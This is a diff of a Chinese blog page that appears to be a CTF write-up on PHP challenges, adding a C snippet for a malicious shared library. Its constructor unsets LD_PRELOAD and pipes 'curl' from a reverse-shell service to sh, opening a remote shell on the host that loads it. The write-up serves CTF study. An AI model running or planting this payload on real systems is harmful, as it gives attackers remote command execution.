@@ -769,11 +769,11 @@
       
         <div class="post-detail-header_wordcount">
           <span class="totalcount">
-            <i class="fas fa-file-text-o"></i> 字数统计: 5.3k |
+            <i class="fas fa-file-text-o"></i> 字数统计: 5.4k |
           </span>
   
           <span class="min2read">
-            <i class="fas fa-clock"></i> 阅读时长: 23分钟 |
+            <i class="fas fa-clock"></i> 阅读时长: 24分钟 |
           </span>
   
           
@@ -1226,7 +1226,17 @@ if(isset($env))&#123;
 &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>这里跟上面那题大同小异，上面的题目是直接缓存了我们的shell，而这题我们需要直接缓存一个恶意的so文件。  </p>
-<h5 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h5><p>恶意的so文件使用上面做过的题目生成的就行了</p>
+<h5 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h5><p>恶意的so文件使用上面做过的题目生成的就行了，也可</p>
+<pre class="line-numbers language-none"><code class="language-none">#include&lt;stdlib.h&gt;
+#include&lt;stdio.h&gt;
+#include&lt;string.h&gt;
+__attribute__ ((__constructor__)) void preload(void)
+&#123;
+    unsetenv(&quot;LD_PRELOAD&quot;);
+    system(&quot;curl https:&#x2F;&#x2F;your-shell.com&#x2F;175.178.47.228:8888 | sh&quot;);
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>以用下面的c文件生成</p>
 <pre class="line-numbers language-none"><code class="language-none"># -*- coding: utf-8 -*-
 # @Author: h1xa
 # @Date:   2022-04-27 12:43:50
